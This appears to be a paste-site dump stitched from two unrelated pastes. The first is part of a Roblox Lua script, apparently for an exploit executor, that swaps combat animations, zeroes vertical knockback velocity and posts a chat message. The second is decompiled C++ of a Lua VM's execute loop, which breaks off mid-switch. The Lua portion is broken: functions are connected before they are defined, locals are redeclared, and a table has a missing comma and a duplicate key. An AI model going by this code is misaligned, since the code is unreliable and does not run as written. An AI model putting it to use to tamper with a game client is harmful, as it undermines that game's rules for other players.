local AnimAnim = Instance.new(""Animation"")
 
AnimAnim.AnimationId = ""rbxassetid://18179181663""
 
local Anim = Humanoid:LoadAnimation(AnimAnim)
 
 
local startTime = 0
 
 
Anim:Play()
 
Anim:AdjustSpeed(0)
 
Anim.TimePosition = startTime
 
Anim:AdjustSpeed(1)
 
 
    end
 
end
 
--[[END OF MOVE 4 ANIM]]
 
--[[Wall combo]]
 
humanoid.AnimationPlayed:Connect(onAnimationPlayed)
 
local animationId = 15955393872
 
 
local player = game.Players.LocalPlayer
 
local character = player.Character or player.CharacterAdded:Wait()
 
local humanoid = character:WaitForChild(""Humanoid"")
 
 
local function onAnimationPlayed(animationTrack)
 
    if animationTrack.Animation.AnimationId == ""rbxassetid://"" .. animationId then
 
local p = game.Players.LocalPlayer
 
local Humanoid = p.Character:WaitForChild(""Humanoid"")
 
 
for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
 
    animTrack:Stop()
 
end
 
 
local AnimAnim = Instance.new(""Animation"")
 
AnimAnim.AnimationId = ""rbxassetid://15943915877""
 
local Anim = Humanoid:LoadAnimation(AnimAnim)
 
 
local startTime = 0.05
 
 
Anim:Play()
 
Anim:AdjustSpeed(0)
 
Anim.TimePosition = startTime
 
Anim:AdjustSpeed(1)
 
 
    end
 
end
 
--[[END OF WALL COMBO ANIM]]
 
--[[Ult Activation]]
 
humanoid.AnimationPlayed:Connect(onAnimationPlayed)
 
 
local animationId = 12447707844
 
 
local player = game.Players.LocalPlayer
 
local character = player.Character or player.CharacterAdded:Wait()
 
local humanoid = character:WaitForChild(""Humanoid"")
 
 
local function onAnimationPlayed(animationTrack)
 
    if animationTrack.Animation.AnimationId == ""rbxassetid://"" .. animationId then
 
local p = game.Players.LocalPlayer
 
local Humanoid = p.Character:WaitForChild(""Humanoid"")
 
 
for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
 
    animTrack:Stop()
 
end
 
 
local AnimAnim = Instance.new(""Animation"")
 
AnimAnim.AnimationId = ""rbxassetid://17106858586 ""
 
local Anim = Humanoid:LoadAnimation(AnimAnim)
 
 
local startTime = 0
 
 
Anim:Play()
 
Anim:AdjustSpeed(0)
 
Anim.TimePosition = startTime
 
Anim:AdjustSpeed(1)
 
    end
 
end
--[[END OF ULT ACTIVATION ANIM]]
 
--[[Uppercut]]
humanoid.AnimationPlayed:Connect(onAnimationPlayed)
 
 
local animationId = 10503381238
 
 
local player = game.Players.LocalPlayer
 
local character = player.Character or player.CharacterAdded:Wait()
 
local humanoid = character:WaitForChild(""Humanoid"")
 
 
local function onAnimationPlayed(animationTrack)
 
    if animationTrack.Animation.AnimationId == ""rbxassetid://"" .. animationId then
 
local p = game.Players.LocalPlayer
 
local Humanoid = p.Character:WaitForChild(""Humanoid"")
 
 
for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
 
    animTrack:Stop()
 
end
 
 
local AnimAnim = Instance.new(""Animation"")
 
AnimAnim.AnimationId = ""rbxassetid://14900168720""
 
local Anim = Humanoid:LoadAnimation(AnimAnim)
 
 
local startTime = 1.3
 
 
Anim:Play()
 
Anim:AdjustSpeed(0)
 
Anim.TimePosition = startTime
 
Anim:AdjustSpeed(0.7)
 
 
    end
 
end
 
--[[END OF UPPERCUT ANIM]]
 
--[[Downslam]]
 
humanoid.AnimationPlayed:Connect(onAnimationPlayed)
 
 
local animationId = 10470104242
 
 
local player = game.Players.LocalPlayer
 
local character = player.Character or player.CharacterAdded:Wait()
 
local humanoid = character:WaitForChild(""Humanoid"")
 
 
local function onAnimationPlayed(animationTrack)
 
    if animationTrack.Animation.AnimationId == ""rbxassetid://"" .. animationId then
 
local p = game.Players.LocalPlayer
 
local Humanoid = p.Character:WaitForChild(""Humanoid"")
 
 
for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
 
    animTrack:Stop()
 
end
 
 
local AnimAnim = Instance.new(""Animation"")
 
AnimAnim.AnimationId = ""rbxassetid://12447247483""
 
local Anim = Humanoid:LoadAnimation(AnimAnim)
 
 
local startTime = 0
 
 
wait(0.2)
 
Anim:Play()
 
Anim:AdjustSpeed(0)
 
Anim.TimePosition = startTime
 
Anim:AdjustSpeed(6)
 
 
    end
 
end
 
--[[END OF DOWNSLAM ANIM]]
 
--[[Punch anims]]
 
humanoid.AnimationPlayed:Connect(onAnimationPlayed)
 
 
local Players = game:GetService(""Players"")
 
local player = Players.LocalPlayer
 
local character = player.Character or player.CharacterAdded:Wait()
 
local humanoid = character:WaitForChild(""Humanoid"")
 
 
local animationIdsToStop = {
 
    [17859015788] = true, --downslam finisher
 
    [10469493270] = true, --punch1
 
    [10469630950] = true, --punch2
 
    [10469639222] = true, --punch3
 
    [10469643643] = true, --punch4
 
}
 
 
local replacementAnimations = {
 
    [""10469493270""] = ""rbxassetid://17889458563"", --punch1
 
    [""10469630950""] = ""rbxassetid://17889461810"", --punch2
 
    [""10469639222""] = ""rbxassetid://17889471098"", --punch3
 
    [""10469643643""] = ""rbxassetid://17889290569"", --punch4
 
    [""17859015788""] = ""rbxassetid://12684185971"", --downslam finisher
 
    [""11365563255""] = ""rbxassetid://14516273501"" --punch idk

    [""11343318134""] = ""rbxassetid://14348083862"", -- ult move
    
    [""11365563255""] = ""rbxassetid://16737255386"", -- ult move
    
    [""12983333733""] = ""rbxassetid://12832505612"", -- ult move
    
    [""13927612951""] = ""rbxassetid://15121659862"", -- ult move
 
}
 
 
local queue = {}
 
local isAnimating = false
 
 
local function playReplacementAnimation(animationId)
 
    if isAnimating then
 
        table.insert(queue, animationId)
 
        return
 
    end
 
   
 
    isAnimating = true
 
    local replacementAnimationId = replacementAnimations[tostring(animationId)]
 
    if replacementAnimationId then
 
        local AnimAnim = Instance.new(""Animation"")
 
        AnimAnim.AnimationId = replacementAnimationId
 
        local Anim = humanoid:LoadAnimation(AnimAnim)
 
        Anim:Play()
 
       
 
        Anim.Stopped:Connect(function()
 
            isAnimating = false
 
            if #queue > 0 then
 
                local nextAnimationId = table.remove(queue, 1)
 
                playReplacementAnimation(nextAnimationId)
 
            end
 
        end)
 
    else
 
        isAnimating = false
 
    end
 
end
 
 
local function stopSpecificAnimations()
 
    for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
 
        local animationId = tonumber(track.Animation.AnimationId:match(""%d+""))
 
        if animationIdsToStop[animationId] then
 
            track:Stop()
 
        end
 
    end
 
end
 
 
local function onAnimationPlayed(animationTrack)
 
    local animationId = tonumber(animationTrack.Animation.AnimationId:match(""%d+""))
 
    if animationIdsToStop[animationId] then
 
        stopSpecificAnimations()
 
        animationTrack:Stop()
 
       
 
        local replacementAnimationId = replacementAnimations[tostring(animationId)]
 
        if replacementAnimationId then
 
            playReplacementAnimation(animationId)
 
        end
 
    end
 
end
 
 
humanoid.AnimationPlayed:Connect(onAnimationPlayed)
 
 
local player = game.Players.LocalPlayer
 
local character = player.Character or player.CharacterAdded:Wait()
 
local humanoidRootPart = character:WaitForChild(""HumanoidRootPart"")
 
 
local function onBodyVelocityAdded(bodyVelocity)
 
    if bodyVelocity:IsA(""BodyVelocity"") then
 
        bodyVelocity.Velocity = Vector3.new(bodyVelocity.Velocity.X, 0, bodyVelocity.Velocity.Z)
 
    end
 
end
 
 
character.DescendantAdded:Connect(onBodyVelocityAdded)
 
 
for _, descendant in pairs(character:GetDescendants()) do
 
    onBodyVelocityAdded(descendant)
 
end
 
 
player.CharacterAdded:Connect(function(newCharacter)
 
    character = newCharacter
 
    humanoidRootPart = character:WaitForChild(""HumanoidRootPart"")
 
    character.DescendantAdded:Connect(onBodyVelocityAdded)
 
   
 
    for _, descendant in pairs(character:GetDescendants()) do
 
        onBodyVelocityAdded(descendant)
 
    end
 
end) 
 
--[[Adding Quote or Message when Executed]]
 
local player = game.Players.LocalPlayer
repeat wait() until player.Character
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild(""Humanoid"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
 
-- Messages to send
local messages = {""Alrighty >:)""}
 
local function sendMessage(text)
    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, ""All"")
end
 
for _, message in ipairs(messages) do
    sendMessage(message)
end
 
--[[END OF QUOTES]]
 
--[[Execute Anims (Animations when you execute script]]
 
local p = game.Players.LocalPlayer
local Humanoid = p.Character:WaitForChild(""Humanoid"")
 
for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
    animTrack:Stop()
end
 
local AnimAnim = Instance.new(""Animation"")
AnimAnim.AnimationId = ""rbxassetid://14611879113"" -- Replace with your animation ID
 
local Anim = Humanoid:LoadAnimation(AnimAnim)
 
local startTime = 0.05
 
Anim:Play()
Anim:AdjustSpeed(0)
Anim.TimePosition = startTime
Anim:AdjustSpeed(1)
 
--[[END OF EXECUTE ANIMS]]
 
-- Loadstring created using LoadstringR --"
ViiJvJgn,Untitled,xConquerPS,C++,Tuesday 15th of April 2025 10:42:29 AM CDT,"int __fastcall luaV_execute(int *a1)
{
  int *v1; // r3
  int *v2; // r3
  char *v3; // r12
  int v4; // r0
  int v5; // r1
  int v6; // r2
  int v7; // r3
  char *v8; // r12
  int v9; // r1
  int v10; // r2
  int v11; // r3
  _DWORD *v12; // r3
  char *v13; // r12
  int v14; // r1
  int v15; // r2
  int v16; // r3
  char *v17; // r3
  int *v19; // r3
  char *v20; // r12
  int v21; // r0
  int v22; // r1
  int v23; // r2
  int v24; // r3
  int v25; // r3
  _BOOL4 v26; // r3
  char *v27; // r12
  int v28; // r1
  int v29; // r2
  int v30; // r3
  int v31; // r3
  _BOOL4 v32; // r3
  char *v33; // r12
  int v34; // r1
  int v35; // r2
  int v36; // r3
  int v37; // r3
  int **v38; // r3
  int v39; // r3
  int *v40; // r12
  int *v41; // r1
  int *v42; // r2
  int *v43; // r3
  int *v44; // r12
  int v45; // r1
  int v46; // r2
  int v47; // r3
  int v48; // r3
  int **v49; // r3
  int v50; // r3
  int *v51; // r12
  int *v52; // r1
  int *v53; // r2
  int *v54; // r3
  int v55; // r4
  int v56; // r0
  int *v57; // r3
  char *v58; // r12
  int v59; // r1
  int v60; // r2
  int v61; // r3
  _BOOL4 v62; // r3
  char *v63; // r12
  int v64; // r1
  int v65; // r2
  int v66; // r3
  int v67; // r3
  int v68; // r3
  int v69; // r3
  int v70; // r3
  int v71; // r3
  int v72; // r3
  int v73; // r3
  int v74; // r3
  int v75; // r3
  int v76; // r3
  int v77; // r3
  int v78; // r3
  int v79; // r3
  int v80; // r3
  int v81; // r3
  int v82; // r3
  int v83; // r3
  int v84; // r3
  int v85; // r3
  int v86; // r3
  int v87; // r3
  int v88; // r3
  int v89; // r3
  int v90; // r3
  __int64 v91; // r0
  int v92; // r3
  int v93; // r3
  int v94; // r3
  __int64 v95; // r0
  int v96; // r3
  int v97; // r3
  __int64 v98; // r0
  int v99; // r3
  int v100; // r3
  int v101; // r3
  __int64 v102; // r0
  int v103; // r3
  double v104; // r0
  int v105; // r3
  int v106; // r3
  int v107; // r3
  _BOOL4 v108; // r3
  _BOOL4 v109; // r3
  _BOOL4 v110; // r3
  char *v111; // r12
  int v112; // r1
  int v113; // r2
  int v114; // r3
  char *v115; // r3
  int v116; // r3
  int v117; // r3
  int v118; // r0
  int v119; // r2
  int v120; // r3
  int v121; // r0
  int v122; // r2
  int v123; // r3
  int v124; // r0
  _BOOL4 v125; // r3
  _BOOL4 v126; // r3
  char *v127; // r12
  int v128; // r1
  int v129; // r2
  int v130; // r3
  int *v131; // r3
  _DWORD *v132; // r12
  int v133; // r0
  int v134; // r1
  int v135; // r2
  int v136; // r3
  int v137; // r3
  int result; // r0
  _BOOL4 v139; // r3
  _BOOL4 v140; // r3
  double v142; // r2
  _BOOL4 v143; // r3
  _BOOL4 v144; // r3
  _BOOL4 v145; // r3
  char *v146; // r12
  int v147; // r1
  int v148; // r2
  int v149; // r3
  char *v150; // r12
  int v151; // r1
  int v152; // r2
  int v153; // r3
  char *v154; // r12
  int v155; // r1
  int v156; // r2
  int v157; // r3
  int *v158; // r3
  char *v159; // r12
  int v160; // r1
  int v161; // r2
  int v162; // r3
  _DWORD *v163; // r3
  int v164; // r3
  int *v165; // r3
  char *v166; // r12
  int v167; // r0
  int v168; // r1
  int v169; // r2
  int v170; // r3
  double v172; // [sp+10h] [bp-3F4h] BYREF
  __int64 v173; // [sp+18h] [bp-3ECh] BYREF
  double v174; // [sp+20h] [bp-3E4h] BYREF
  int v175; // [sp+2Ch] [bp-3D8h] BYREF
  __int64 v176; // [sp+30h] [bp-3D4h] BYREF
  __int64 v177; // [sp+38h] [bp-3CCh] BYREF
  double v178; // [sp+40h] [bp-3C4h] BYREF
  double v179; // [sp+48h] [bp-3BCh] BYREF
  double v180; // [sp+50h] [bp-3B4h] BYREF
  double v181; // [sp+58h] [bp-3ACh] BYREF
  double v182; // [sp+60h] [bp-3A4h] BYREF
  __int64 v183; // [sp+68h] [bp-39Ch] BYREF
  __int64 v184; // [sp+70h] [bp-394h] BYREF
  __int64 v185; // [sp+78h] [bp-38Ch] BYREF
  __int64 v186; // [sp+80h] [bp-384h] BYREF
  __int64 v187; // [sp+88h] [bp-37Ch] BYREF
  __int64 v188; // [sp+90h] [bp-374h] BYREF
  __int64 v189; // [sp+98h] [bp-36Ch] BYREF
  __int64 v190; // [sp+A0h] [bp-364h] BYREF
  __int64 v191; // [sp+A8h] [bp-35Ch] BYREF
  __int64 v192; // [sp+B0h] [bp-354h] BYREF
  __int64 v193; // [sp+B8h] [bp-34Ch] BYREF
  __int64 v194; // [sp+C0h] [bp-344h] BYREF
  double v195; // [sp+C8h] [bp-33Ch] BYREF
  double v196; // [sp+D0h] [bp-334h] BYREF
  double v197; // [sp+D8h] [bp-32Ch] BYREF
  double v198; // [sp+E0h] [bp-324h] BYREF
  double v199; // [sp+E8h] [bp-31Ch] BYREF
  double v200; // [sp+F0h] [bp-314h] BYREF
  double v201; // [sp+F8h] [bp-30Ch] BYREF
  double v202; // [sp+100h] [bp-304h] BYREF
  unsigned int v203; // [sp+108h] [bp-2FCh]
  char *v204; // [sp+10Ch] [bp-2F8h]
  int v205; // [sp+110h] [bp-2F4h]
  char *v206; // [sp+114h] [bp-2F0h]
  int v207; // [sp+118h] [bp-2ECh]
  int v208; // [sp+11Ch] [bp-2E8h]
  char *v209; // [sp+120h] [bp-2E4h]
  int v210; // [sp+124h] [bp-2E0h]
  char *v211; // [sp+128h] [bp-2DCh]
  char *v212; // [sp+12Ch] [bp-2D8h]
  char *v213; // [sp+130h] [bp-2D4h]
  char *v214; // [sp+134h] [bp-2D0h]
  char *v215; // [sp+138h] [bp-2CCh]
  char *v216; // [sp+13Ch] [bp-2C8h]
  char *v217; // [sp+140h] [bp-2C4h]
  char *v218; // [sp+144h] [bp-2C0h]
  char *v219; // [sp+148h] [bp-2BCh]
  char *v220; // [sp+14Ch] [bp-2B8h]
  double v221; // [sp+150h] [bp-2B4h]
  char *v222; // [sp+15Ch] [bp-2A8h]
  char *v223; // [sp+160h] [bp-2A4h]
  char *v224; // [sp+164h] [bp-2A0h]
  char *v225; // [sp+168h] [bp-29Ch]
  char *v226; // [sp+16Ch] [bp-298h]
  double v227; // [sp+170h] [bp-294h]
  double v228; // [sp+178h] [bp-28Ch]
  double v229; // [sp+180h] [bp-284h]
  char *v230; // [sp+188h] [bp-27Ch]
  char *v231; // [sp+18Ch] [bp-278h]
  __int64 v232; // [sp+190h] [bp-274h]
  __int64 v233; // [sp+198h] [bp-26Ch]
  __int64 v234; // [sp+1A0h] [bp-264h]
  int v235; // [sp+1ACh] [bp-258h]
  char *v236; // [sp+1B0h] [bp-254h]
  _DWORD *v237; // [sp+1B4h] [bp-250h]
  int v238; // [sp+1B8h] [bp-24Ch]
  int v239; // [sp+1BCh] [bp-248h]
  int v240; // [sp+1C0h] [bp-244h]
  int v241; // [sp+1C4h] [bp-240h]
  int v242; // [sp+1C8h] [bp-23Ch]
  int v243; // [sp+1CCh] [bp-238h]
  int v244; // [sp+1D0h] [bp-234h]
  char *v245; // [sp+1D4h] [bp-230h]
  char *v246; // [sp+1D8h] [bp-22Ch]
  unsigned int v247; // [sp+1DCh] [bp-228h]
  unsigned int v248; // [sp+1E0h] [bp-224h]
  char *v249; // [sp+1E4h] [bp-220h]
  _BOOL4 v250; // [sp+1E8h] [bp-21Ch]
  _DWORD *v251; // [sp+1ECh] [bp-218h]
  char *v252; // [sp+1F0h] [bp-214h]
  int v253; // [sp+1F4h] [bp-210h]
  char *v254; // [sp+1F8h] [bp-20Ch]
  char *v255; // [sp+1FCh] [bp-208h]
  double v256; // [sp+200h] [bp-204h]
  int v257; // [sp+208h] [bp-1FCh]
  char *v258; // [sp+20Ch] [bp-1F8h]
  double *v259; // [sp+210h] [bp-1F4h]
  double *v260; // [sp+214h] [bp-1F0h]
  char *v261; // [sp+218h] [bp-1ECh]
  char *v262; // [sp+21Ch] [bp-1E8h]
  double v263; // [sp+220h] [bp-1E4h]
  double v264; // [sp+228h] [bp-1DCh] BYREF
  int v265; // [sp+230h] [bp-1D4h]
  int v266; // [sp+234h] [bp-1D0h]
  char *v267; // [sp+238h] [bp-1CCh]
  char *v268; // [sp+23Ch] [bp-1C8h]
  __int64 v269; // [sp+240h] [bp-1C4h]
  __int64 v270; // [sp+248h] [bp-1BCh] BYREF
  int v271; // [sp+250h] [bp-1B4h]
  int v272; // [sp+254h] [bp-1B0h]
  char *v273; // [sp+258h] [bp-1ACh]
  int v274; // [sp+25Ch] [bp-1A8h]
  int v275; // [sp+260h] [bp-1A4h]
  char *v276; // [sp+264h] [bp-1A0h]
  int v277; // [sp+268h] [bp-19Ch]
  int v278; // [sp+26Ch] [bp-198h]
  char *v279; // [sp+270h] [bp-194h]
  int v280; // [sp+274h] [bp-190h]
  int v281; // [sp+278h] [bp-18Ch]
  char *v282; // [sp+27Ch] [bp-188h]
  int v283; // [sp+280h] [bp-184h]
  int v284; // [sp+284h] [bp-180h]
  char *v285; // [sp+288h] [bp-17Ch]
  int v286; // [sp+28Ch] [bp-178h]
  int v287; // [sp+290h] [bp-174h]
  char *v288; // [sp+294h] [bp-170h]
  double *v289; // [sp+298h] [bp-16Ch]
  double *v290; // [sp+29Ch] [bp-168h]
  char *v291; // [sp+2A0h] [bp-164h]
  char *v292; // [sp+2A4h] [bp-160h]
  double v293; // [sp+2A8h] [bp-15Ch]
  double v294; // [sp+2B0h] [bp-154h]
  int v295; // [sp+2B8h] [bp-14Ch]
  int v296; // [sp+2BCh] [bp-148h]
  char *v297; // [sp+2C0h] [bp-144h]
  char *v298; // [sp+2C4h] [bp-140h]
  double v299; // [sp+2C8h] [bp-13Ch]
  double v300; // [sp+2D0h] [bp-134h]
  int v301; // [sp+2D8h] [bp-12Ch]
  int v302; // [sp+2DCh] [bp-128h]
  char *v303; // [sp+2E0h] [bp-124h]
  char *v304; // [sp+2E4h] [bp-120h]
  double v305; // [sp+2E8h] [bp-11Ch]
  double v306; // [sp+2F0h] [bp-114h]
  int v307; // [sp+2FCh] [bp-108h]
  int v308; // [sp+300h] [bp-104h]
  char *v309; // [sp+304h] [bp-100h]
  char *v310; // [sp+308h] [bp-FCh]
  int v311; // [sp+30Ch] [bp-F8h]
  int *v312; // [sp+310h] [bp-F4h]
  int *v313; // [sp+314h] [bp-F0h]
  int v314; // [sp+318h] [bp-ECh]
  char *v315; // [sp+31Ch] [bp-E8h]
  int v316; // [sp+320h] [bp-E4h]
  unsigned int v317; // [sp+324h] [bp-E0h]
  unsigned int v318; // [sp+328h] [bp-DCh]
  int **v319; // [sp+32Ch] [bp-D8h]
  _DWORD *v320; // [sp+330h] [bp-D4h]
  int *v321; // [sp+334h] [bp-D0h]
  int **v322; // [sp+338h] [bp-CCh]
  int **v323; // [sp+33Ch] [bp-C8h]
  _DWORD *v324; // [sp+340h] [bp-C4h]
  int *v325; // [sp+344h] [bp-C0h]
  char *v326; // [sp+348h] [bp-BCh]
  _DWORD *v327; // [sp+34Ch] [bp-B8h]
  int *v328; // [sp+350h] [bp-B4h]
  char *v329; // [sp+354h] [bp-B0h]
  _DWORD *v330; // [sp+358h] [bp-ACh]
  int *v331; // [sp+35Ch] [bp-A8h]
  char *v332; // [sp+360h] [bp-A4h]
  unsigned int v333; // [sp+364h] [bp-A0h]
  char *v334; // [sp+368h] [bp-9Ch]
  char *v335; // [sp+36Ch] [bp-98h]
  _DWORD *v336; // [sp+370h] [bp-94h]
  char *v337; // [sp+374h] [bp-90h]
  _DWORD *v338; // [sp+378h] [bp-8Ch]
  char *v339; // [sp+37Ch] [bp-88h]
  _DWORD *v340; // [sp+380h] [bp-84h]
  unsigned int v341; // [sp+384h] [bp-80h]
  int v342; // [sp+388h] [bp-7Ch]
  int v343; // [sp+38Ch] [bp-78h]
  int v344; // [sp+390h] [bp-74h]
  int *v345; // [sp+394h] [bp-70h]
  unsigned int v346; // [sp+398h] [bp-6Ch]
  int v347; // [sp+39Ch] [bp-68h]
  unsigned int v348; // [sp+3A0h] [bp-64h]
  int v349; // [sp+3A4h] [bp-60h]
  int v350; // [sp+3A8h] [bp-5Ch]
  int v351; // [sp+3ACh] [bp-58h]
  int j; // [sp+3B0h] [bp-54h]
  int v353; // [sp+3B4h] [bp-50h]
  unsigned int v354; // [sp+3B8h] [bp-4Ch]
  unsigned int v355; // [sp+3BCh] [bp-48h]
  int v356; // [sp+3C0h] [bp-44h]
  int i; // [sp+3C4h] [bp-40h]
  double v358; // [sp+3C8h] [bp-3Ch]
  int *v359; // [sp+3D0h] [bp-34h]
  int *v360; // [sp+3D4h] [bp-30h]
  int *v361; // [sp+3D8h] [bp-2Ch]
  int *v362; // [sp+3DCh] [bp-28h]
  int *v363; // [sp+3E0h] [bp-24h]
  unsigned int v364; // [sp+3E4h] [bp-20h]
  char *v365; // [sp+3E8h] [bp-1Ch]
  unsigned int v366; // [sp+3ECh] [bp-18h]
  int v367; // [sp+3F0h] [bp-14h]
  int v368; // [sp+3F4h] [bp-10h]

  v368 = a1[5];
  *(_WORD *)(v368 + 34) |= 8u;
LABEL_2:
  v350 = **(_DWORD **)v368;
  v349 = *(_DWORD *)(*(_DWORD *)(v350 + 12) + 48);
  v367 = *(_DWORD *)(v368 + 16);
  while ( 2 )
  {
    v1 = *(int **)(v368 + 20);
    *(_DWORD *)(v368 + 20) = v1 + 1;
    v366 = *v1;
    if ( (a1[28] & 0xC) != 0 )
    {
      sub_74BF724(a1);
      v367 = *(_DWORD *)(v368 + 16);
    }
    v365 = (char *)(v367 + 16 * (unsigned __int8)(v366 >> 6));
    switch ( v366 & 0x3F )
    {
      case 0u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v67 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v67 = v367 + 16 * (v366 >> 23);
        v308 = v67;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v68 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v68 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v307 = v68;
        if ( *(_DWORD *)(v308 + 8) == 19 && *(_DWORD *)(v307 + 8) == 19 )
        {
          v306 = *(double *)v308;
          v305 = *(double *)v307;
          v304 = v365;
          *(_QWORD *)v365 = *(_QWORD *)&v305 + *(_QWORD *)&v306;
          *((_DWORD *)v304 + 2) = 19;
          continue;
        }
        if ( *(_DWORD *)(v308 + 8) == 3 )
        {
          v202 = *(double *)v308;
        }
        else if ( !sub_74D7704((_DWORD *)v308, &v202) )
        {
          goto LABEL_105;
        }
        if ( *(_DWORD *)(v307 + 8) == 3 )
        {
          v201 = *(double *)v307;
LABEL_104:
          v69 = 1;
          goto LABEL_106;
        }
        if ( sub_74D7704((_DWORD *)v307, &v201) )
          goto LABEL_104;
LABEL_105:
        v69 = 0;
LABEL_106:
        if ( v69 )
        {
          v303 = v365;
          *(double *)v365 = v202 + v201;
          *((_DWORD *)v303 + 2) = 3;
        }
        else
        {
          sub_74D63E8(a1, v308, v307, v365, 6);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 1u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v70 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v70 = v367 + 16 * (v366 >> 23);
        v302 = v70;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v71 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v71 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v301 = v71;
        if ( *(_DWORD *)(v302 + 8) == 19 && *(_DWORD *)(v301 + 8) == 19 )
        {
          v300 = *(double *)v302;
          v299 = *(double *)v301;
          v298 = v365;
          *(_QWORD *)v365 = *(_QWORD *)&v300 - *(_QWORD *)&v299;
          *((_DWORD *)v298 + 2) = 19;
          continue;
        }
        if ( *(_DWORD *)(v302 + 8) == 3 )
        {
          v200 = *(double *)v302;
        }
        else if ( !sub_74D7704((_DWORD *)v302, &v200) )
        {
          goto LABEL_125;
        }
        if ( *(_DWORD *)(v301 + 8) == 3 )
        {
          v199 = *(double *)v301;
LABEL_124:
          v72 = 1;
          goto LABEL_126;
        }
        if ( sub_74D7704((_DWORD *)v301, &v199) )
          goto LABEL_124;
LABEL_125:
        v72 = 0;
LABEL_126:
        if ( v72 )
        {
          v297 = v365;
          *(double *)v365 = v200 - v199;
          *((_DWORD *)v297 + 2) = 3;
        }
        else
        {
          sub_74D63E8(a1, v302, v301, v365, 7);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 2u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v73 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v73 = v367 + 16 * (v366 >> 23);
        v296 = v73;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v74 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v74 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v295 = v74;
        if ( *(_DWORD *)(v296 + 8) == 19 && *(_DWORD *)(v295 + 8) == 19 )
        {
          v294 = *(double *)v296;
          v293 = *(double *)v295;
          v292 = v365;
          *(_QWORD *)v365 = *(_QWORD *)&v293 * *(_QWORD *)&v294;
          *((_DWORD *)v292 + 2) = 19;
          continue;
        }
        if ( *(_DWORD *)(v296 + 8) == 3 )
        {
          v198 = *(double *)v296;
        }
        else if ( !sub_74D7704((_DWORD *)v296, &v198) )
        {
          goto LABEL_145;
        }
        if ( *(_DWORD *)(v295 + 8) == 3 )
        {
          v197 = *(double *)v295;
LABEL_144:
          v75 = 1;
          goto LABEL_146;
        }
        if ( sub_74D7704((_DWORD *)v295, &v197) )
          goto LABEL_144;
LABEL_145:
        v75 = 0;
LABEL_146:
        if ( v75 )
        {
          v291 = v365;
          *(double *)v365 = v198 * v197;
          *((_DWORD *)v291 + 2) = 3;
        }
        else
        {
          sub_74D63E8(a1, v296, v295, v365, 8);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 3u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v96 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v96 = v367 + 16 * (v366 >> 23);
        v272 = v96;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v97 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v97 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v271 = v97;
        if ( *(_DWORD *)(v272 + 8) == 19 && *(_DWORD *)(v271 + 8) == 19 )
        {
          v270 = *(_QWORD *)v272;
          v269 = *(_QWORD *)v271;
          v268 = v365;
          v98 = sub_74D95AC(a1, &v270, v270, HIDWORD(v270), v269, HIDWORD(v269));
          *(_QWORD *)v268 = v98;
          *((_DWORD *)v268 + 2) = 19;
          continue;
        }
        if ( *(_DWORD *)(v272 + 8) == 3 )
        {
          v184 = *(_QWORD *)v272;
        }
        else if ( !sub_74D7704((_DWORD *)v272, (double *)&v184) )
        {
          goto LABEL_267;
        }
        if ( *(_DWORD *)(v271 + 8) == 3 )
        {
          v183 = *(__int64 *)v271;
LABEL_266:
          v99 = 1;
          goto LABEL_268;
        }
        if ( sub_74D7704((_DWORD *)v271, (double *)&v183) )
          goto LABEL_266;
LABEL_267:
        v99 = 0;
LABEL_268:
        if ( v99 )
        {
          v358 = fmod(*(double *)&v184, *(double *)&v183);
          if ( *(double *)&v183 * v358 < 0.0 )
            v358 = v358 + *(double *)&v183;
          v267 = v365;
          *(double *)v365 = v358;
          *((_DWORD *)v267 + 2) = 3;
        }
        else
        {
          sub_74D63E8(a1, v272, v271, v365, 9);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 4u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v105 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v105 = v367 + 16 * (v366 >> 23);
        v260 = (double *)v105;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v106 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v106 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v259 = (double *)v106;
        if ( *((_DWORD *)v260 + 2) == 3 )
        {
          v180 = *v260;
        }
        else if ( !sub_74D7704(v260, &v180) )
        {
          goto LABEL_306;
        }
        if ( *((_DWORD *)v259 + 2) == 3 )
        {
          v179 = *v259;
LABEL_305:
          v107 = 1;
          goto LABEL_307;
        }
        if ( sub_74D7704(v259, &v179) )
          goto LABEL_305;
LABEL_306:
        v107 = 0;
LABEL_307:
        if ( v107 )
        {
          v258 = v365;
          *(double *)v258 = pow(v180, v179);
          *((_DWORD *)v258 + 2) = 3;
        }
        else
        {
          sub_74D63E8(a1, v260, v259, v365, 10);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 5u:
